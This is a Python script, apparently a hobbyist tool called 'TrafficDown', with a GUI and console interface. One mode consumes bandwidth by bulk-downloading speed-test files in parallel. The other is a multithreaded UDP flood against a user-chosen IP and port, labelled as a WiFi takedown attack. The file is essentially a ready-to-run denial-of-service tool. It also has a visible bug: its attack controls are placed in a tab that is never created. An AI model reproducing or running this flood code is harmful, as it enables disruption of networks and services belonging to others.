#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import asyncio
import threading
import socket
import random
import subprocess
import queue
from datetime import datetime, timedelta

# --- КОНФИГУРАЦИЯ И АВТО-УСТАНОВКА ---
VERSION = "5.0 CYBERPUNK"
CONFIG_FILE = "td_config_v5.json"
IS_ANDROID = "com.termux" in os.environ.get("PREFIX", "")
IS_WINDOWS = os.name == 'nt'

def install_libs():
    """Умная установка зависимостей"""
    required = ["aiohttp", "rich", "psutil", "requests"]
    if IS_WINDOWS:
        required.append("customtkinter")
        required.append("packaging") 

    missing = []
    for lib in required:
        try:
            __import__(lib)
        except ImportError:
            missing.append(lib)
    
    if missing:
        print(f"Installing missing libs: {', '.join(missing)}...")
        subprocess.check_call([sys.executable, "-m", "pip", "install"] + missing)
        os.execl(sys.executable, sys.executable, *sys.argv)

install_libs()

# --- ИМПОРТЫ ---
import aiohttp
import psutil
from rich.live import Live
from rich.layout import Layout
from rich.panel import Panel
from rich.table import Table
from rich.console import Console
from rich.align import Align
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich import box

GUI_AVAILABLE = False
try:
    if not IS_ANDROID:
        import customtkinter as ctk
        GUI_AVAILABLE = True
except ImportError:
    pass

# --- URLS (High Speed Sources) ---
URLS = [
    'https://speed.hetzner.de/10GB.bin',
    'https://proof.ovh.net/files/10Gb.dat',
    'http://speedtest.tele2.net/10GB.zip',
    'http://speedtest-ny.turnkeyinternet.net/10000mb.bin',
    'https://speedtest.selectel.ru/10GB',
]

# --- SETTINGS MANAGER ---
class SettingsManager:
    def __init__(self):
        self.default = {
            "udp_ip": "192.168.0.1",
            "udp_port": "80",
            "threads_dl": 15,
            "threads_ul": 100,
            "packet_size": 1400,
            "theme": "Dark"
        }
        self.config = self.load()

    def load(self):
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r') as f:
                    return {**self.default, **json.load(f)} # Merge with defaults
            except:
                return self.default
        return self.default

    def save(self):
        with open(CONFIG_FILE, 'w') as f:
            json.dump(self.config, f, indent=4)

    def get(self, key):
        return self.config.get(key, self.default.get(key))

    def set(self, key, value):
        self.config[key] = value
        self.save()

# --- ENGINE (ASYNC CORE) ---
class TrafficEngine:
    def __init__(self, settings_mgr):
        self.settings = settings_mgr
        self.running = False
        self.mode = "IDLE"
        self.stats_lock = threading.Lock()
        self.start_time = None
        
        # Counters
        self.total_dl = 0
        self.total_ul = 0
        self.session_dl = 0 # Для текущей сессии
        self.session_ul = 0
        self.errors = 0
        
        # Async Loop
        self.loop = asyncio.new_event_loop()
        self.thread = threading.Thread(target=self._start_loop, daemon=True)
        self.thread.start()

    def _start_loop(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()

    def start_download(self):
        if self.running: return
        self.running = True
        self.mode = "DOWNLOAD"
        self.start_time = datetime.now()
        self.session_dl = 0
        
        count = int(self.settings.get("threads_dl"))
        for _ in range(count):
            asyncio.run_coroutine_threadsafe(self._http_worker(), self.loop)

    def start_flood(self, ip, port):
        if self.running: return
        self.running = True
        self.mode = "UDP FLOOD"
        self.start_time = datetime.now()
        self.session_ul = 0
        
        # Сохраняем последние настройки как дефолтные
        self.settings.set("udp_ip", ip)
        self.settings.set("udp_port", port)
        
        count = int(self.settings.get("threads_ul"))
        for _ in range(count):
            asyncio.run_coroutine_threadsafe(self._udp_worker(ip, int(port)), self.loop)

    def stop(self):
        self.running = False
        self.mode = "IDLE"

    async def _http_worker(self):
        connector = aiohttp.TCPConnector(verify_ssl=False, limit=0)
        async with aiohttp.ClientSession(connector=connector) as session:
            while self.running and self.mode == "DOWNLOAD":
                try:
                    url = random.choice(URLS)
                    async with session.get(url, timeout=5) as resp:
                        while self.running:
                            chunk = await resp.content.read(1024 * 1024)
                            if not chunk: break
                            with self.stats_lock:
                                self.total_dl += len(chunk)
                                self.session_dl += len(chunk)
                except:
                    self.errors += 1
                    await asyncio.sleep(1)

    async def _udp_worker(self, ip, port):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        size = int(self.settings.get("packet_size"))
        payload = os.urandom(size)
        
        while self.running and self.mode == "UDP FLOOD":
            try:
                sock.sendto(payload, (ip, port))
                with self.stats_lock:
                    self.total_ul += size
                    self.session_ul += size
                if self.session_ul % (size * 50) == 0: await asyncio.sleep(0)
            except:
                self.errors += 1
                await asyncio.sleep(0.1)

    def get_stats(self):
        with self.stats_lock:
            # Format bytes to GB/MB
            def fmt(b): return b / 1024 / 1024
            
            return {
                "dl_mb": fmt(self.total_dl),
                "ul_mb": fmt(self.total_ul),
                "dl_session_mb": fmt(self.session_dl),
                "ul_session_mb": fmt(self.session_ul),
                "errors": self.errors,
                "running": self.running,
                "mode": self.mode,
                "duration": str(datetime.now() - self.start_time).split('.')[0] if self.running else "0:00:00"
            }

# --- GUI (CUSTOMTKINTER) ---
class CyberGUI:
    def __init__(self, engine, settings):
        self.engine = engine
        self.settings = settings
        
        # Setup Window
        self.root = ctk.CTk()
        self.root.title(f"TrafficDown {VERSION}")
        self.root.geometry("900x650")
        ctk.set_appearance_mode("Dark")
        ctk.set_default_color_theme("green") # Neon green vibe
        
        self.last_dl = 0
        self.last_ul = 0
        self.last_time = time.time()
        self.pulse_state = False
        
        self._init_ui()
        self._updater()
        
    def _init_ui(self):
        # Налаштування сітки (Grid) для головного вікна
        self.root.grid_columnconfigure(0, weight=0) 
        self.root.grid_columnconfigure(1, weight=1) 
        self.root.grid_rowconfigure(0, weight=1)
        
        # --- SIDEBAR ---
        self.sidebar = ctk.CTkFrame(self.root, width=200, corner_radius=0)
        self.sidebar.grid(row=0, column=0, sticky="nsew") 
        
        ctk.CTkLabel(self.sidebar, text="TRAFFIC\nDOWN", font=("Arial Black", 24)).pack(pady=30)
        
        self.btn_dash = ctk.CTkButton(self.sidebar, text="DASHBOARD", command=lambda: self.select_frame("dash"), fg_color="transparent", border_width=2)
        self.btn_dash.pack(pady=10, padx=20, fill="x")
        
        self.btn_set = ctk.CTkButton(self.sidebar, text="SETTINGS", command=lambda: self.select_frame("set"), fg_color="transparent", border_width=2)
        self.btn_set.pack(pady=10, padx=20, fill="x")
        
        self.status_lbl = ctk.CTkLabel(self.sidebar, text="IDLE", font=("Consolas", 12), text_color="gray")
        self.status_lbl.pack(side="bottom", pady=20)

        # --- MAIN FRAMES ---
        self.frames = {}
        self.frames["dash"] = self._create_dashboard()
        self.frames["set"] = self._create_settings()
        
        self.select_frame("dash")

    def _create_dashboard(self):
        # This will now align correctly with the rest of the class methods
        frame = ctk.CTkFrame(self.root, fg_color="transparent")
        # ... rest of the code
        
        # Big Counters (З'їдений трафік)
        self.stats_frame = ctk.CTkFrame(frame, fg_color="#1a1a1a", corner_radius=15)
        self.stats_frame.pack(fill="x", padx=20, pady=20)
        
        ctk.CTkLabel(self.stats_frame, text="СЪЕДЕНО ТРАФИКА (ВСЕГО)", font=("Arial", 12, "bold"), text_color="gray").pack(pady=(15, 5))
        
        self.lbl_total_eaten = ctk.CTkLabel(self.stats_frame, text="0.00 GB", font=("Consolas", 50, "bold"), text_color="#00FF00")
        self.lbl_total_eaten.pack(pady=10)
        
        # Speedometers
        speed_frame = ctk.CTkFrame(frame, fg_color="transparent")
        speed_frame.pack(fill="x", padx=20)
        
        # DL Speed
        self.box_dl = ctk.CTkFrame(speed_frame, fg_color="#0d1f0d")
        self.box_dl.pack(side="left", fill="both", expand=True, padx=5)
        ctk.CTkLabel(self.box_dl, text="СКОРОСТЬ СЖИРАНИЯ", text_color="#00FF00").pack(pady=5)
        self.lbl_spd_dl = ctk.CTkLabel(self.box_dl, text="0.0 MB/s", font=("Arial", 24, "bold"))
        self.lbl_spd_dl.pack(pady=10)
        
        # UL Speed
        self.box_ul = ctk.CTkFrame(speed_frame, fg_color="#1f0d0d")
        self.box_ul.pack(side="right", fill="both", expand=True, padx=5)
        ctk.CTkLabel(self.box_ul, text="СКОРОСТЬ ОТДАЧИ", text_color="#FF0000").pack(pady=5)
        self.lbl_spd_ul = ctk.CTkLabel(self.box_ul, text="0.0 MB/s", font=("Arial", 24, "bold"))
        self.lbl_spd_ul.pack(pady=10)

        # Controls
        ctrl_frame = ctk.CTkFrame(frame, corner_radius=10, border_width=1, border_color="gray")
        ctrl_frame.pack(fill="both", expand=True, padx=20, pady=20)
        
        # Tabs for controls
        self.tabs = ctk.CTkTabview(ctrl_frame)
        self.tabs.pack(fill="both", expand=True, padx=10, pady=10)
        self.tabs.add("DOWNLOAD")
        self.tabs.add("Снос WiFi")
        
        # DL Tab
        ctk.CTkButton(self.tabs.tab("DOWNLOAD"), text="🔥 НАЧАТЬ Сжирание", command=self.toggle_dl, 
                     height=50, font=("Arial", 16, "bold"), fg_color="#2ecc71", hover_color="#27ae60").pack(pady=40, padx=50, fill="x")
        
        # UL Tab
        self.in_ip = ctk.CTkEntry(self.tabs.tab("UDP ATTACK"), placeholder_text="Target IP")
        self.in_ip.pack(pady=10, fill="x", padx=20)
        self.in_ip.insert(0, self.settings.get("udp_ip")) # DEFAULT VALUE
        
        self.in_port = ctk.CTkEntry(self.tabs.tab("UDP ATTACK"), placeholder_text="Port")
        self.in_port.pack(pady=5, fill="x", padx=20)
        self.in_port.insert(0, self.settings.get("udp_port")) # DEFAULT VALUE
        
        ctk.CTkButton(self.tabs.tab("UDP ATTACK"), text="☠ НАЧАТЬ Снос WiFi", command=self.toggle_ul,
                     height=50, font=("Arial", 16, "bold"), fg_color="#e74c3c", hover_color="#c0392b").pack(pady=20, padx=50, fill="x")

        return frame

    def _create_settings(self):
        frame = ctk.CTkFrame(self.root, fg_color="transparent")
        ctk.CTkLabel(frame, text="НАСТРОЙКИ ЯДРА", font=("Arial", 20, "bold")).pack(pady=20)
        
        # Threads
        ctk.CTkLabel(frame, text="Потоки Сжирания:").pack()
        self.sl_dl = ctk.CTkSlider(frame, from_=1, to=50)
        self.sl_dl.set(int(self.settings.get("threads_dl")))
        self.sl_dl.pack(fill="x", padx=50)
        
        ctk.CTkLabel(frame, text="Потоки атаки:").pack()
        self.sl_ul = ctk.CTkSlider(frame, from_=10, to=200)
        self.sl_ul.set(int(self.settings.get("threads_ul")))
        self.sl_ul.pack(fill="x", padx=50)
        
        ctk.CTkButton(frame, text="СОХРАНИТЬ", command=self.save_conf, height=40, fg_color="green").pack(pady=50)
        return frame

    def select_frame(self, name):
        for f in self.frames.values(): 
            f.grid_forget() # Замість pack_forget
        self.frames[name].grid(row=0, column=1, sticky="nsew") # Замість pack
    def toggle_dl(self):
        if self.engine.running:
            self.engine.stop()
        else:
            self.engine.start_download()

    def toggle_ul(self):
        if self.engine.running:
            self.engine.stop()
        else:
            self.engine.start_flood(self.in_ip.get(), self.in_port.get())

    def save_conf(self):
        self.settings.set("threads_dl", int(self.sl_dl.get()))
        self.settings.set("threads_ul", int(self.sl_ul.get()))

    def _updater(self):
        stats = self.engine.get_stats()
        
        # Calc Speed
        now = time.time()
        delta = now - self.last_time if now - self.last_time > 0.1 else 0.1
        dl_s = (stats["dl_mb"] - self.last_dl) / delta
        ul_s = (stats["ul_mb"] - self.last_ul) / delta
        
        self.last_dl = stats["dl_mb"]
        self.last_ul = stats["ul_mb"]
        self.last_time = now
        
        # Update Text
        total_gb = (stats["dl_mb"] + stats["ul_mb"]) / 1024
        self.lbl_total_eaten.configure(text=f"{total_gb:.2f} GB")
        
        self.lbl_spd_dl.configure(text=f"{dl_s:.1f} MB/s")
        self.lbl_spd_ul.configure(text=f"{ul_s:.1f} MB/s")
        
        # Animation (Pulse Effect)
        if stats["running"]:
            self.pulse_state = not self.pulse_state
            color = "#00FF00" if self.pulse_state else "#005500"
            err_color = "#FF0000" if self.pulse_state else "#550000"
            
            if stats["mode"] == "DOWNLOAD":
                self.lbl_spd_dl.configure(text_color=color)
                self.status_lbl.configure(text=f"ЗАГРУЗКА... {stats['duration']}", text_color="green")
            else:
                self.lbl_spd_ul.configure(text_color=err_color)
                self.status_lbl.configure(text=f"АТАКА... {stats['duration']}", text_color="red")
        else:
            self.status_lbl.configure(text="IDLE", text_color="gray")
            self.lbl_spd_dl.configure(text_color="white")
            self.lbl_spd_ul.configure(text_color="white")

        self.root.after(200, self._updater) # 5 FPS refresh for smooth anim

    def run(self):
        self.root.mainloop()

# --- CONSOLE UI (RICH) ---
class ConsoleUI:
    def __init__(self, engine, settings):
        self.engine = engine
        self.settings = settings
        self.console = Console()

    def run(self):
        self.console.clear()
        
        # Меню
        while True:
            self.console.print(Panel("[bold green]TRAFFIC DOWN ТЕСТОВАЯ ВЕРСИЯ[/] [dim]Console Edition[/]", style="on black"))
            self.console.print(f"[1] Начать сжирание трафика (Defaults: {self.settings.get('threads_dl')} threads)")
            self.console.print(f"[2] Снос WiFi (Default: {self.settings.get('udp_ip')}:{self.settings.get('udp_port')})")
            
            choice = self.console.input("[bold yellow]Выбор > [/]")
            
            if choice == "1":
                self.engine.start_download()
                break
            elif choice == "2":
                ip = self.console.input(f"Target IP [{self.settings.get('udp_ip')}]: ") or self.settings.get('udp_ip')
                port = self.console.input(f"Port [{self.settings.get('udp_port')}]: ") or self.settings.get('udp_port')
                self.engine.start_flood(ip, port)
                break
        
        # Dashboard Loop
        with Live(refresh_per_second=4) as live:
            last_dl = 0
            last_ul = 0
            last_time = time.time()
            
            while True:
                stats = self.engine.get_stats()
                now = time.time()
                delta = now - last_time if now - last_time > 0.1 else 0.1
                
                sp_dl = (stats["dl_mb"] - last_dl) / delta
                sp_ul = (stats["ul_mb"] - last_ul) / delta
                last_dl, last_ul, last_time = stats["dl_mb"], stats["ul_mb"], now
                
                # Layout
                table = Table(box=box.ROUNDED)
                table.add_column("Метрика")
                table.add_column("Значение", style="bold yellow")
                
                total_gb = (stats["dl_mb"] + stats["ul_mb"]) / 1024
                
                table.add_row("СТАТУС", f"{stats['mode']} ({stats['duration']})")
                table.add_row("СЪЕДЕНО ВСЕГО", f"[bold red]{total_gb:.3f} GB[/]")
                table.add_row("Скорость DL", f"[green]{sp_dl:.1f} MB/s[/]")
                table.add_row("Скорость UL", f"[red]{sp_ul:.1f} MB/s[/]")
                table.add_row("Ошибки", str(stats['errors']))
                
                live.update(Panel(table, title="Live Traffic Monitor", border_style="blue"))
                time.sleep(0.25)

# --- MAIN ---
if __name__ == "__main__":
    sett = SettingsManager() # Створюємо налаштування
    eng = TrafficEngine(sett) # Створюємо двигун (ОСЬ ЦЕЙ РЯДОК МАЄ БУТИ ОБОВ'ЯЗКОВО)
    
    try:
        # Примусово намагаємося запустити графіку
        import customtkinter as ctk
        app = CyberGUI(eng, sett)
        app.run()
    except Exception as e:
        # Якщо все ж таки вибило помилку — ми її побачимо
        print(f"ПОМИЛКА ЗАПУСКУ GUI: {e}")
        # Запускаємо консоль як запасний варіант
        ui = ConsoleUI(eng, sett)
        ui.run()